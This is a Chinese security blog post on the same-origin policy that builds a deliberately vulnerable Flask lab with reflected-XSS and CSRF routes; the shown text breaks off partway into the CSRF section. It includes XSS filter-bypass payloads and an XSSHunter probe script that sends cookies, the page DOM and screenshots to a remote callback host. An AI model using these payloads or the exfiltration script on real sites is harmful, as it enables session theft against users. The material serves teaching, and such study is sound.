---
layout:     post
title:      "基于同源策略的前端漏洞剖析"
subtitle:   "基于同源策略的前端漏洞剖析"
date:       2019-03-10 12:00:00
author:     "T-bag"
header-img: "img/post-bg-unix-linux.jpg"
header-mask: 0.3
catalog:    true
tags:
    - web安全
    - 前端安全
---

## 前言

闲来无事，把《web之困》，《黑客攻防宝典浏览器实战篇》，《web前端黑客技术解密》这三本书，又看了一遍，看的过程中也了却自己关于同源策略和自编码等浏览器机制的困惑，受益良多，因为这三本书对于前端安全的讲解已经概括的非常详细了，所以本文章也仅仅只是对于这些书的一点总结和阅读心得吧。

## 浏览器机制

首先，我们还是要了解一下，浏览器的基本运行机制的。现在的web应用主要采用的是客户端-服务器模型，客户端与服务器通信采用的是请求响应的方式，而浏览器作为该模型的客户端，主要是负责请求，而服务器端负责响应，最后将资源返回给浏览器端进行展示。

### URL

既然前面说到，客户端用于请求资源，那么请求过程中，又是如何定位到正确的正确的资源上的呢，这里就不得不说到URL(Uniform Resource Locator 统一资源定位器)了，每条正确的URL格式都对应服务器上的的HTML 图片等资源。
一条可以正确访问服务器端资源的URL地址格式如下
`scheme://address[:port]/path/[?query]#fragment`
详解一下该格式

1. Scheme （协议名称），常用的协议有HTTP，HTTPS，FTP，包括，`javascritp:`，`data:`，等伪协议，还有还有一些浏览器自己定义的协议，如Chrome的`chrome:`等协议
2. address（服务器地址），服务器地址可以是域名，如 [baidu.com](http://baidu.com/) 也可以是IPV4地址，如127.0.0.1。
3. port（服务器端口），服务器上的每种协议通常会对应一种端口，如HTTP的80，端口，通过域名访问时候，不加端口的话，通常会指向服务器的80端口，如果一些存放为与非标准端口的情况，则要通过域名:port，可IP:port，如baidu.com:5000等格式进行访问
4. path（文件路径）表示文件资源在服务器中的路径，为Unix的形式
5. query（查询字符串）表示服务器的脚本接受的参数
6. fragment（片段ID）HTML页面上的锚，如页面定义`<p id ="jump">`，通过类似于`http://xx.com/1.php#jump`的形式，就可以跳转到改点上，#后面的值直接通过页面进行处理，并不会传递给服务端，这里也是可能出现xss跨站脚本攻击的地方

最后拼接出URL来，一段可以正常访问服务器资源的URL格式类似于这样子：
`http://example.com/test/test.php?a=1#jump`
这里值的重点说一下的是URL的编码格式，为一个百分号和该字符的ASCII编码所对应的2位十六进制数字，例如“/”的URL编码为%2F，URL编码对应的JavaScript编码的函数对象有：
escape函数，其不会编码的字符有`*/@+-._0-9a-zA-Z`
encodeURI函数，不编码字符有`!#$&’()*+,/:;=?@-._~0-9a-zA-Z`
encodeURIComponent函数，不编码字符有`!’()*-._~0-9a-zA-Z`
值的注意的是浏览器的不同，也会导致URL编码的差异。这里就不赘述了
如下图：

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa4d0e0a6-a7bb-49eb-8aff-64993b5c82a5%2FAD779807-513D-44E8-9885-FDBEAFA2EEB2.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa4d0e0a6-a7bb-49eb-8aff-64993b5c82a5%2FAD779807-513D-44E8-9885-FDBEAFA2EEB2.png)

这些编码函数，分别对应这JavaScript中的unescape，decodeUR，decodeURICompot这三个解码函数。浏览器的自编码不仅有URL编码，还有HTML，JavaScript等编码，后面谈到xss的绕过的时候会重点讲述一下。

### HTTP协议

既然讲到了URL，就不得不提与之最为密切关联的HTTP协议，前面说过每条正确的URL对应于服务端上的资源，当浏览器处理请求的时候，如果URL中的协议为HTTP的话，就会建立一个HTTP会话，并与服务器建立一个TCP连接，会先三次握手，保证与服务器端的正常连接。在获取到响应之后，服务器daunt会断开TCP连接。
回过头来看一下，HTTP会话的格式，以HTTP

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F759ce43b-1f55-42ec-a7d5-7443e879f66c%2FB59710E0-6FAB-4451-B027-3C546F756ED5.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F759ce43b-1f55-42ec-a7d5-7443e879f66c%2FB59710E0-6FAB-4451-B027-3C546F756ED5.png)

HTTP报文的第一行，通常包含HTTP的版本信息，如HTTP/1.1等，下面几行为headers，格式为`name : value`的格式，常用的request Header有

    Accept	用户代理期望的MIME 类型列表
    Authorization	包含用服务器验证用户代理的凭证
    Content-Type	指示服务器文档的MIME 类型。帮助用户代理（浏览器）去处理接收到的数据。
    User-Agent  浏览器版本信息
    orgin 
    Referer

常见的response headers有

    Access-Control-Allow-Credentials
    Access-Control-Allow-Origin
    Content-Security-Policy

具体的headers可以参考mozilla上的的开发者文档[https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers)，上面的几个header也与我们后续讲到的同源策略相关联。
在观察上面的报文的时候，可以发现请求方法为GET，常见的HTTP请求方法有

    GET 
    GET方法请求一个指定资源的表示形式. 使用GET的请求应该只被用于获取数据.
    HEAD 
    HEAD方法请求一个与GET请求的响应相同的响应，但没有响应体.
    POST 
    POST方法用于将实体提交到指定的资源，通常导致状态或服务器上的副作用的更改.

其它的请求方法还有PUT，DELETE等
观察response的时候，可以看到返回的状态码，常见的状态码有

    200 OK 请求成功
    302 Found 资源跳转临时重定向
    404 Not Found 请求的资源没有在服务器中被发现
    403 Forbidden 拒绝执行
    401 Unauthorized 没有权限，如果要正常请求权限的时候，在请求头上必选包含正确Authorization 头信息
    500 Internal Server Error 在服务端发生错误，无法正确解析请求数据的时候就会报500错误

这些知识点主要是为了我们后续讲解同源策略的时候作为基础，要看更多关于HTTP协议的详细内容话，可以阅读mozilla的[开发者文档](https://developer.mozilla.org/zh-CN/docs/Web/HTTP)

### 同源策略

在mozilla的中文文档中对于同源 策略是这样描述的：同源策略限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互，这是一个用于隔离潜在恶意文件的重要安全机制。
简单的说也就是你不可以从a.com去访问b.com的内容。具体的同源策略如下:
下表给出了相对`http://site.baidu.com/xxx.html`同源检测的示例:

    URL	结果	 原因
    <http://site.baidu.com/xxx.html>	成功	 
    <http://site.baidu.com/xxx/xxx.html>	成功	 
    <https://site.baidu.com/xxx.html>	失败	不同协议 ( https和http )
    <http://site.baidu.com:81/xxx/xxx.html>	失败	不同端口 ( 81和80)
    <http://family.company.com/xxx/xxx.html>	失败	不同域名 ( family和site )

总结的说，符合同源的情况，必须同协议，同域名，同端口。
当然有的情况下，开发者需要跨域获取数据，如从a.com需要获取api.b.com上的JSON数据，很显然这两个域是非同源的。这是就需要用到跨域了，浏览器对于跨域支持的API有H5的postMessage，还有针对XMLHttpRequest的同源策略，CORS，CORS也是我们非常需要注意的地方，它与前面讲的几个header也息息相关。关于CORS的内容，我们暂且留到后面讲XSS，CORS等前端漏洞的时候在细谈。

## 前端漏洞

前面的关于浏览器的一些机制，已经过了一遍，接下来就会正式开始讲解前端的一些漏洞了。为了更好的理解这些漏洞的形成原理，将会结合一些漏洞代码进行讲解。（漏洞环境由Python+Flask进行编写，为什么用Python呢，因为Python是宇宙最好的语言，不予反驳）
项目目录结构：
[img]

### XSS

这里先从最基本的的反射性xss说起。编写如下漏洞代码
[sec.py](http://sec.py/)

    @interface.route('/xss/reflect', methods=['GET'])
    def reFlectedXss():
        if request.method == 'GET':
            id = request.args.get('id')
            resp = make_response(render_template('index.html',id = id))
            resp.headers['Content-Type'] = 'text/html'
            return resp

Index.html，需要注意的是Flask自带的jinja2模板对字符串采取了自动html编码转义。所以这里在jinja2设置过滤器标志为safe，即认定字符串为安全的，否则会被自动转义。如`<svg/onload=alert(1)>`会被转义为`&lt;svg/onload=alert(1)&gt;`。
```
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Title</title>
    </head>
    <body>
    { % block content % }
    {{ id | safe }}<!--添加safe标志，确认字符串为安全的-->
    { % endblock % }
    </body>
    </html>
```

现在开始测试，输入URL`http://127.0.0.1:5000/sec/xss/reflect?id=<svg/onlaod=alert(1)>`
这里使用的是最新版的Chrome。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe087d4f1-745b-4bef-b12e-6ee07343a351%2FEA6E5FEF-FEEC-429E-9E5D-692A036779A9.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe087d4f1-745b-4bef-b12e-6ee07343a351%2FEA6E5FEF-FEEC-429E-9E5D-692A036779A9.png)

正常情况下，因为Chrome的XSS_AUDITOR的防御机制，我们的恶意代码会被直接拦截下来。无法执行，如图

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3bc52a6b-1b0b-406e-a49d-ace574a1c064%2F96031383-767C-4BA6-A8BD-0AFEF89203FC.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3bc52a6b-1b0b-406e-a49d-ace574a1c064%2F96031383-767C-4BA6-A8BD-0AFEF89203FC.png)

这里直接给一段参考GitHub上大佬的文章[Browser’s XSS Filter Bypass Cheat Sheet](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)中的payload。
`<meta%20charset=iso-2022-jp><svg%20o%1B(Bnload=alert(1)>`
访问`http://127.0.0.1:5000/sec/xss/reflect?id=%3Cmeta%20charset=iso-2022-jp%3E%3Csvg%20o%1B(Bnload=alert(1)%3E`。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa1f048bb-81e1-4238-b9cf-e86a55a5492e%2F443BE8AA-623B-43EC-9068-3C17A6AC3150.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa1f048bb-81e1-4238-b9cf-e86a55a5492e%2F443BE8AA-623B-43EC-9068-3C17A6AC3150.png)

可以看到触发弹窗了，绕过了Chrome的XSS_AUDITOR，导致该绕过的原因是在因为在ISO-2022-JP编码格式下的HTML会忽略`[0x1B](B`字符。把这段字符插入到payload中间，从而导致XSS_AUDITOR没有把这段payload作为可执行的恶意代码。所以编码的差异也是导致漏洞发生的原因。

当然只是弹一个窗是没什么卵用，至少能获取一下别人的cookie吧。这里推荐一款XSS接收平台[XSSHunter](https://xsshunter.com/)。接下来会剖析这款XSS平台是如何接收目标域数据的。
这段是XssHunter中最常用的payload。
`"><script src=https://your.xss.ht></script>`，
这里把之前那段URL修改一下。在src中插入ISO-2022-JP编码格式的`[0x1B](B`字符来绕过XSS_AUDITOR。
`http://127.0.0.1:5000/sec/xss/reflect?id=%3Cmeta%20charset=iso-2022-jp%3E%3Cscript%20s%1B(Brc=https://wm.xss.ht%3E%3C/script%3E`
请求URL，也就是当目标用户打开这段URL的话，就中招了，目标域加载远程JS，并将当前域下的document对象下的cookie等属性发送给接收网址`https://your.xss.ht`，效果如下。可以看到，获取了截图，URL，IP，COOKIE，UA等数据。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9e37d416-c20e-416e-ae0f-3d2ad6fd5312%2F43972D4F-E7A6-4190-BD8D-FBC69F4DECD0.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9e37d416-c20e-416e-ae0f-3d2ad6fd5312%2F43972D4F-E7A6-4190-BD8D-FBC69F4DECD0.png)

好吧，前面说过，浏览器有同源策略的，`http://127.0.0.1:5000/` 跟`https://your.xss.ht`很明显并不是同域，那么又是如何跨域发送数据的呢。下面我会讲解一下xssHunter中的JS代码。理解下其中的跨域机制，填一下前面的坑。

XssHunter的JS很简单，看一下具体的流程。
它的流程图如下：

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F71755962-65fb-41b3-aa8a-78ee258192b2%2FAE3C91EF-7A8F-43D3-B27D-9411B51B95D5.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F71755962-65fb-41b3-aa8a-78ee258192b2%2FAE3C91EF-7A8F-43D3-B27D-9411B51B95D5.png)

我们测试一下，首先在自己页面上加载远程JS`<script src=https://your.xss.ht></script>`，也可以吧直接把`https://your.xss.ht`上的JS脚本dump下来，本地包含，这样加载比较快，为了方便，我把它dump下来本地调试下。

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <script src="./xsshunter.js"></script> <!--本地的XssHunter JS-->
        <title>Title</title>
    </head>
    <body>
    </body>
    </html>

首先JS会将dom对象的cookie属性和bom中的location的orgin属性，navigator的userAgent属性等存放到probe_return_data对象中。

    probe_return_data = {};
    
    // Prevent failure incase the browser refuses to give us any of the probe data.
    try {
        probe_return_data['cookies'] = never_null( document.cookie );
    } catch ( e ) {
        probe_return_data['cookies'] = '';
    }
    try {
        probe_return_data['user-agent'] = never_null( navigator.userAgent );
    } catch ( e ) {
        probe_return_data['user-agent'] = '';
    }
    //省略一堆
    try {
        probe_return_data['origin'] = never_null( location.origin );
    } catch ( e ) {
        probe_return_data['origin'] = '';
    }

然后，JS会先判断HTML文档的document对象是否加载完成，通过document的readyState属性值是否为complete来判断，否则的话则通过添加对Window对象的onload的事件监听。确认页面加载完成之后，将会执行hook_load_if_not_ready 的函数。

    if( document.readyState == "complete" ) {
        hook_load_if_not_ready();
    } else {
        //添加Window对象的load监听事件
        addEvent( window, "load", function(){
            hook_load_if_not_ready();//调用hook函数
        });
    }

进入到hook_load_if_not_ready函数中，首先会尝试获取会通过Element元素对象的outerHTML属性获取元素序列化HTML片段。并将其存放在probe_return_data对象中。接下来会使用html2canvas这个第三方JS进行截图，同样的将图片存放在probe_return_data中去。确认截图完成之后，调用finishing_moves。

    function hook_load_if_not_ready() {
        try {
            //获取document下的元素对象
            try {
                probe_return_data['dom'] = never_null( document.documentElement.outerHTML );
            } catch ( e ) {
                probe_return_data['dom'] = '';
            }
            //使用html2canvas进行截图。
            html2canvas(document.body).then(function(canvas) {
                probe_return_data['screenshot'] = canvas.toDataURL();
                //截图完成之后将会，执行finishing_moves函数
                finishing_moves();
            }, function() {
                probe_return_data['screenshot'] = '';
                finishing_moves();
            });
        } catch( e ) {
            probe_return_data['screenshot'] = '';
            finishing_moves();
        }
    }

finishing_moves中将会三个函数：
contact_mothership( probe_return_data )//发送数据
collect_pages();
eval_remote_source( chainload_uri );//加载远程资源

这里讲一下contact_mothership这个函数，函数对象中会实例化XMLHttpRequest对象，然后像probe_return_data对象作为POST数据请求到`https://your.xss.ht/js_callback`中去。

    function contact_mothership( probe_return_data ) {
        var http = new XMLHttpRequest();//实例化XMLHttpRequest对象
        var url = "<https://your.xss.ht/js_callback>";
        http.open("POST", url, true);
        http.setRequestHeader("Content-type", "text/plain");
        http.onreadystatechange = function() {
            if(http.readyState == 4 && http.status == 200) {
    
            }
        }
        if( pgp_key == null || pgp_key == "" ) {
            http.send( JSON.stringify( probe_return_data ) );
        } else {
            generate_pgp_encrypted_email( function( pgp_message ){
                http.send( pgp_message )
            });
        }
    }

看一下Chrome 的DEBUG，`http.send( JSON.stringify( probe_return_data ) )`，这里将数据都发送过去了。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F93af7def-f6d3-48d9-883b-d58a3006d166%2F39A0F47C-795E-41C4-B0BE-ACE0D5C6DB0A.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F93af7def-f6d3-48d9-883b-d58a3006d166%2F39A0F47C-795E-41C4-B0BE-ACE0D5C6DB0A.png)

并且没有任何警告，如果我们将请求的URL更改为`https://www.baidu.com`试一下，Chrome直接给我们警告，请求被禁止。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F8e189bc1-d322-459f-b40e-ca8205842d87%2F76848763-ADD4-4132-B65F-E6D46AC91FF8.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F8e189bc1-d322-459f-b40e-ca8205842d87%2F76848763-ADD4-4132-B65F-E6D46AC91FF8.png)

提示很明显告诉我们碰撞了CORS policy，`http://127.0.0.1:8000`不在Access-Control-Allow-Origin允许范围内。继续我们前面未谈完的CORS跨域策略。摘抄mozilla开发者文档中对于CORS的描述 ----- 跨源资源共享（CORS）是一种机制，它使用其他HTTP标头告诉浏览器让在一个源（域）上运行的Web应用程序有权从不同来源的服务器访问所选资源。Web应用程序在请求具有与其自己的源不同的源（域，协议和端口）的资源时，会发出跨源HTTP请求。

为了满足开发者对于跨域获取API等数据的需求，CORS机制设置了一个HTTP标头`Access-Control-Allow-Origin:`来判断请求域（orgin属性）是否在允许的域中，如果设置为`Access-Control-Allow-Origin: *`将会满足所有域对该域的访问，慎重填写。

看一下`http.send( JSON.stringify( probe_return_data ) )`发送之后的请求和响应报文，重点关注下，响应包中的`Access-Control-Allow-Origin`属性，可以看到这里，设置为`Access-Control-Allow-Origin: *`，并且设置了`Access-Control-Allow-Methods: POST, GET, HEAD, OPTIONS`。所以允许任何域去请求和获取该域的数据。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F42e73d84-28e0-48e0-8b85-7213f7ef67e9%2FD8F7909D-FB18-47BE-B603-69B61B45BB0A.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F42e73d84-28e0-48e0-8b85-7213f7ef67e9%2FD8F7909D-FB18-47BE-B603-69B61B45BB0A.png)

还可以再看一下响应包中的其它几个有意思的header。

    HTTP/1.1 200 OK
    Server: nginx/1.4.6 (Ubuntu)
    Date: Mon, 15 Oct 2018 09:11:41 GMT
    Content-Type: application/x-javascript
    Content-Length: 2
    Connection: close
    X-Xss-Protection: 1; mode=block
    X-Content-Type-Options: nosniff
    Content-Security-Policy: default-src 'self'
    Expires: 0
    Cache-Control: no-cache, no-store, must-revalidate
    Access-Control-Allow-Methods: POST, GET, HEAD, OPTIONS
    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    Pragma: no-cache
    Access-Control-Allow-Credentials: true
    X-Frame-Options: deny
    Access-Control-Allow-Headers: X-Requested-With
    Access-Control-Allow-Origin: *

注意到上面的header有两个防止XSS跨站脚本攻击的，X-Xss-Protection和Content-Security-Policy。还有一个X-Frame-Options用于防止点击劫持的。

1. X-Xss-Protection

设置完 X-Xss-Protection之后，Chrome或者Safari检测到页面中存在xss跨站脚本攻击的话，将会停止页面加载。

    X-XSS-Protection: 0    //禁止xss过滤
    X-XSS-Protection: 1    //启用xss过滤
    X-XSS-Protection: 1; mode=block   //启用xss过滤，如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。
    X-XSS-Protection: 1; report=<reporting-uri>  //启用xss过滤，并发送报告

1. Content-Security-Policy
我们可以设置CSP策略对来限制<script>中的src可以加载的资源，防止第三方资源加载，防止xss跨站脚本攻击
格式类似于`Content-Security-Policy: policy`
如上面的`Content-Security-Policy: default-src 'self'`表示的只允许包含本域的资源。如果要包含其他子域的话，需要这样写.
`Content-Security-Policy: default-src 'self' *.your.com`
其它的限制策略还有还有如下等等：

    frame-src： 限制通过类似<frame> 和<iframe> 标签加载的内嵌内容源。
    img-src: 限制图片和图标源
    script-src：限制javascript 源。
    style-src：限制层叠样式表文件源。

其它详细指令可以参考[CSP文档](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy__by_cnvoid)

在Flask中设置header的方式如下。

    @interface.route('/headers', methods=['GET'])
    def setHeaders():
        if request.method == 'GET':
            resp = make_response(render_template('index.html'))
            resp.headers['X-Xss-Protection'] = '1; mode=block'
            resp.headers['Content-Security-Policy'] = "default-src 'self'"
            resp.headers['Strict-Transport-Security'] = 'max-age=604800'
            return resp

设置完之后，我们就可以在响应头中看到这些header了。

关于xssHunter的讲解暂且告一段落，前面简要说过浏览器中URL的编码和解码，接下来要讲浏览器中的自解码机制，关于浏览器编码和解码的文章，网上已经很多了，可以参考下[浅谈浏览器编解码](http://hackermio.me/2018/05/08/%E6%B5%85%E8%B0%88%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%96%E8%A7%A3%E7%A0%81/)，还有[浅谈XSS—字符编码和浏览器解析原理](https://security.yirendai.com/news/share/26)，这两篇文章写的都很详细。

这里简要概括一下，浏览器会对URL和HTML，JavaScript进行自解码，正常的顺序，一个URL过来，将会调用URL解析器对其进行URLdecode，接下来会对HTML文档进行解析，解析出包含各种元素节点的dom对象来。如果遇到<script>标签，或者onlaod，onerror等会调用JS脚本的情况，就会调用js解析器对其进行解析，然后执行。

HTML实体编码:
最开始的时候有提到，jinja2会对HTML模板内的内容进行HTML实体编码，这样就可以正确显示输入的内容了，例如要在页面上展示`<svg/onload=alert(1)>`，如果不进行实体编码的话，页面的HTML解析就会其中的`<`和`>`认定为HTML标签进行处理。
使用HTML实体的话就可以正常显示了。
`&lt;svg/onload=alert(1)&gt;`

部分编码如下，完整的编码可以参考 [HTML ISO-8859-1 参考手册](http://www.w3school.com.cn/tags/html_ref_entities.html)。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb51b9d2e-c28d-4d4d-93f6-6df4a50fe8bc%2F39079D2B-D630-4C85-9DB6-256B3B850DAA.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb51b9d2e-c28d-4d4d-93f6-6df4a50fe8bc%2F39079D2B-D630-4C85-9DB6-256B3B850DAA.png)

这里的实体编号格式是`&#`开头后面跟上字符的10进制或者16进制ASCII码，然后以`;`作为结尾。可以用余弦大佬的[XSS’OR](https://xssor.io/)进行编码
如`<`的十进制编码为60，那么的实体编号就是`&#60;`

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F75ce5da0-dcc0-405a-9ca2-fab3842aa925%2FA87A3583-3D79-4F95-914D-2ED3A7796169.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F75ce5da0-dcc0-405a-9ca2-fab3842aa925%2FA87A3583-3D79-4F95-914D-2ED3A7796169.png)

JAVASCRIPT编码：
JS支持三位八进制数字，两位十六进制数字，四位十六进制数字进制的编码，如下。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F1e5e2664-f1fd-42eb-b2a9-1aae5f920865%2FD00A19A8-A6F5-4F7B-8F9B-0E6CBCF24908.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F1e5e2664-f1fd-42eb-b2a9-1aae5f920865%2FD00A19A8-A6F5-4F7B-8F9B-0E6CBCF24908.png)

以前黑盒测试遇到过了一个很经典的编码绕过的xss，这里尝试写个复现代码出来。

    @interface.route('/xss/reflect/bypass', methods=['GET'])
    def setHeaderss():
        if request.method == 'GET':
            id = request.args.get('id')
            id = id.replace('\\\\','')
            id = id.replace('#', '')
            id = id.replace('&', '')
            id = id.replace(';','')
            id = id.replace('(', '')
            id = id.replace(')', '')
            resp = make_response(render_template('index.html', id=id))
            resp.headers['Content-Type'] = 'text/html'
            return resp

由代码可知，过滤了`\\`，`;`，`(`，`)`，`#`，`&`经验丰富的xsser，可以直接使用下面这段代码。

    <svg/onload=alert`1`>

很显然，直接会触发弹窗了。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd1ebfef5-26ac-4145-bfe7-08f1a1472d31%2F096E0500-6670-416F-A7D6-30FF87739358.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd1ebfef5-26ac-4145-bfe7-08f1a1472d31%2F096E0500-6670-416F-A7D6-30FF87739358.png)

但这里既然说过是要用编码绕过的方式，去触发弹窗，就得换个思路了。
首先过滤了`(`和`)`和`\\`，那么`<svg/onload=alert(1)>`和`<svg/onload=alert(\\1\\)>`之类的就不好用了。其次过滤了`#`，`&`，`;`。
也就不能使用实体编码之类绕过也不行了。

这里直接给出Payload，便于讲解。

    <iframe/onload=location.href="javascript:aler%22%2b%22t%2%22%2b%2281%2%22%2b%229%22>

Bypass URL 如下
`127.0.0.1:5000/sec/xss/reflect/bypass?id=<iframe/onload=location.href="javascript:aler%22%2b%22t%2%22%2b%2282%2%22%2b%229%22>`

浏览器的地址栏输入URL，这时候会触发URL解析器，解码之后效果如下变成这样。
`<iframe/onload=location.href="javascript:aler"+"t%2"+"82%2"+"9">`

接下来会正常进行HTML解析，这时候遇到了onload事件，触发JS解析器进行执行。这时候会对onload事件中的`location.href="javascript:aler"+"t%2"+"82%2"+"9"`JS代码进行解码。
效果如下：
`location.href="javascript:alert%282%29"`。可以用Chrome Console进行测试。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F74649c3d-6c8f-4c6c-9e12-767a7b6668a0%2FFF5AF893-58A3-4C38-85FF-87DCBC4A796D.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F74649c3d-6c8f-4c6c-9e12-767a7b6668a0%2FFF5AF893-58A3-4C38-85FF-87DCBC4A796D.png)

接着`location.href`，location的href属性更改会触发URL解码器。在经过URL解码，就会变成。
`location.href="javascript:alert(2)`

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6e5e9e38-ae49-4353-9220-88421b6c76a1%2FCD429694-D36F-4693-94D5-2846E5D6B517.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6e5e9e38-ae49-4353-9220-88421b6c76a1%2FCD429694-D36F-4693-94D5-2846E5D6B517.png)

由此触发弹窗。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F1e92f85b-b3d7-4a76-8492-d30b3a7a4db2%2F0C545024-8EEB-4CB7-891E-00E3E1ECE927.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F1e92f85b-b3d7-4a76-8492-d30b3a7a4db2%2F0C545024-8EEB-4CB7-891E-00E3E1ECE927.png)

值得一说到是，通过`location.href="javawscript:alert(location.origin)"`触发的弹窗是会继承原页面的源的。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc9284ed8-6314-47c3-a754-56f76839d8bd%2FCEFC064B-D669-498A-BC55-2810BA5B6CB1.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc9284ed8-6314-47c3-a754-56f76839d8bd%2FCEFC064B-D669-498A-BC55-2810BA5B6CB1.png)

而通过`<iframe/src="javascript:alert(1)">`之类触发的弹窗，是不包含原界面的源的，相当新建了一个新的源。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F85332354-b221-43fe-bcfb-0ea64336b8a4%2FAFD00356-99DD-418C-8C62-20541A436063.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F85332354-b221-43fe-bcfb-0ea64336b8a4%2FAFD00356-99DD-418C-8C62-20541A436063.png)

关于xss的讲解可以暂且告一段落了，其它种类的存储型XSS，DOMXSS，万变不离其宗，大家自己拓展吧。

### CSRF和JSON hijacking

### CSRF

因为CSRF和JSON hjjacking原理类似，所以这里就把它们放一块了，首先讲CSRF，跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方 ——摘自wiki百科。

关于CSRF，我们有两个需要着重理解的问题：

1. 跨域请求的时候什么时候会携带COOKIE
2. CSRF的跨域请求是否违反了同源策略

首先编写漏洞代码，这里需要两个域，一个是攻击者域，一个是目标域。

1. 127.0.0.1:5000（目标域）
设置cookie

    @interface.route('/setcookies', methods=['GET'])
    def setCookies():
        if request.method == 'GET':
            resp = make_response("set cookie success")
            resp.set_cookie('username', 'admin')
            return resp

访问`http://127.0.0.1:5000/sec/setcookies`

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb3951b26-6b83-4f95-8b2b-2686495b5d28%2FDD9F19C3-2874-4C58-8845-93B0D0BB94EC.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fb3951b26-6b83-4f95-8b2b-2686495b5d28%2FDD9F19C3-2874-4C58-8845-93B0D0BB94EC.png)

漏洞代码

    @interface.route('/csrf/post', methods=['GET','POST'])
    def csrfTest():
        if request.method == 'POST':
            username = request.cookies.get("username")
            print(username)
            if username == "admin":
                print("CSRF TEST SUCCESS!!!")
                resp = make_response(username)
                return resp
            else:
                return "vaild fail"
    
        username = request.cookies.get("username")
        print(username)
        return "false"

